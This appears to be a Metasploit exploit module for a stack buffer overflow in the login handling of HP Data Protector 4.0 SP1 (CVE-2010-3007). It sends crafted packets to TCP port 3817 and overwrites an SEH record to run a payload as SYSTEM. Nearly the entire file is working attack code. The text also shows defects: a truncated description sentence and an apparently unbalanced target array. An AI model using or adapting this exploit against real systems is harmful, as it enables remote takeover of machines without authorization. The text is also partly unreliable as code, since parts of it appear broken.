# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;HP Data Protector DtbClsLogin Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack buffer overflow in HP Data Protector 4.0 SP1. The
                overflow occurs during the login process, in the DtbClsLogin function provided by
                the dpwindtb.dll component, where the Utf8Cpy (strcpy like function) is used in an
                insecure way with the username. A successful exploitation will lead to code execution
                Service) process, which runs as SYSTEM by default.
            },
            &#039;Author&#039;         =>
                [
                    &#039;AbdulAziz Hariri&#039;, # Vulnerability discovery
                    &#039;juan vazquez&#039; # Metasploit module
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2010-3007&#039; ],
                    [ &#039;OSVDB&#039;, &#039;67973&#039; ],
                    [ &#039;BID&#039;, &#039;43105&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-10-174/&#039; ],
                    [ &#039;URL&#039;, &#039;http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02498535&#039; ]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039; => 712,
                    &#039;BadChars&#039; => "\x00",
                    &#039;DisableNops&#039; => true
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                        {
                            &#039;Ret&#039; => 0x66dd3e49, # ppr from ifsutil.dll (stable over windows updates on June 26, 2012)
                            &#039;Offset&#039; => 712
                        }
                    ]
                ],
            &#039;DefaultTarget&#039; => 0,
            &#039;Privileged&#039;     => true,
            &#039;DisclosureDate&#039; => &#039;Sep 09 2010&#039;
            ))
        register_options(
            [
                Opt::RPORT(3817),
            ], self.class)
    end
 
    def check
        connect
 
        machine_name = rand_text_alpha(15)
 
        print_status("#{sock.peerinfo} - Sending Hello Request")
        hello =  "\x54\x84\x00\x00\x00\x00\x00\x00" << "\x00\x01\x00\x00\x92\x00\x00\x00"
        hello << "\x3a\x53\xa5\x71\x02\x40\x80\x00" << "\x89\xff\xb5\x00\x9b\xe8\x9a\x00"
        hello << "\x01\x00\x00\x00\xc0\xa8\x01\x86" << "\x00\x00\x00\x00\x00\x00\x00\x00"
        hello << "\x00\x00\x00\x00\x00\x00\x00\x00" << "\x00\x00\x00\x00\x00\x00\x00\x00"
        hello << "\x00\x00\x00\x00\x01\x00\x00\x00" << "\x00\x00\x00\x00\x00\x00\x00\x00"
        hello << "\x00\x00\x00\x00"
        hello << machine_name << "\x00"
        hello << "\x5b\x2e\xad\x71\xb0\x02\x00\x00" << "\xff\xff\x00\x00\x06\x10\x00\x44"
        hello << "\x74\x62\x3a\x20\x43\x6f\x6e\x74" << "\x65\x78\x74\x00\xe8\xc1\x08\x10"
        hello << "\xb0\x02\x00\x00\xff\xff\x00\x00" << "\x06\x10\x00\x00\x7c\xfa"
 
        sock.put(hello)
        hello_response = sock.get
        disconnect
 
        if hello_response and hello_response =~ /Dtb: Context/
            return Exploit::CheckCode::Detected
        end
 
        return Exploit::CheckCode::Safe
 
    end
 
    def exploit
 
        connect
 
        machine_name = rand_text_alpha(15)
 
        print_status("#{sock.peerinfo} - Sending Hello Request")
        hello =  "\x54\x84\x00\x00\x00\x00\x00\x00" << "\x00\x01\x00\x00\x92\x00\x00\x00"
        hello << "\x3a\x53\xa5\x71\x02\x40\x80\x00" << "\x89\xff\xb5\x00\x9b\xe8\x9a\x00"
        hello << "\x01\x00\x00\x00\xc0\xa8\x01\x86" << "\x00\x00\x00\x00\x00\x00\x00\x00"
        hello << "\x00\x00\x00\x00\x00\x00\x00\x00" << "\x00\x00\x00\x00\x00\x00\x00\x00"
        hello << "\x00\x00\x00\x00\x01\x00\x00\x00" << "\x00\x00\x00\x00\x00\x00\x00\x00"
        hello << "\x00\x00\x00\x00"
        hello << machine_name << "\x00"
        hello << "\x5b\x2e\xad\x71\xb0\x02\x00\x00" << "\xff\xff\x00\x00\x06\x10\x00\x44"
        hello << "\x74\x62\x3a\x20\x43\x6f\x6e\x74" << "\x65\x78\x74\x00\xe8\xc1\x08\x10"
        hello << "\xb0\x02\x00\x00\xff\xff\x00\x00" << "\x06\x10\x00\x00\x7c\xfa"
 
        sock.put(hello)
        hello_response = sock.get
 
        if not hello_response or hello_response.empty?
            print_error("#{sock.peerinfo} - The Hello Request hasn&#039;t received a response")
            return
        end
 
        bof = payload.encoded
        bof << rand_text(target[&#039;Offset&#039;]-bof.length)
        bof << generate_seh_record(target.ret)
        bof << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-#{target[&#039;Offset&#039;]+8}").encode_string
        # The line below is used to trigger exception, don&#039;t go confused because of the big space,
        # there are only some available bytes until the end of the stack, it allows to assure exception
        # when there are mappings for dynamic memory after the stack, so to assure reliability it&#039;s better
        # to jump back.
        bof << rand_text(100000)
 
        header =  [0x8451].pack("V") # packet id
        header << [0x32020202].pack("V") # svc id
        header << [0x00000018].pack("V") # cmd id
        header << [0].pack("V") # pkt length, calculated after pkt has been built
        header << "\x00\x00\x00\x00" # ?Unknown?
 
        pkt_auth = header
        pkt_auth << bof # username
 
        pkt_auth[12, 4] = [pkt_auth.length].pack("V")
 
        print_status("#{sock.peerinfo} - Sending Authentication Request")
 
        sock.put(pkt_auth)
        disconnect
    end
end

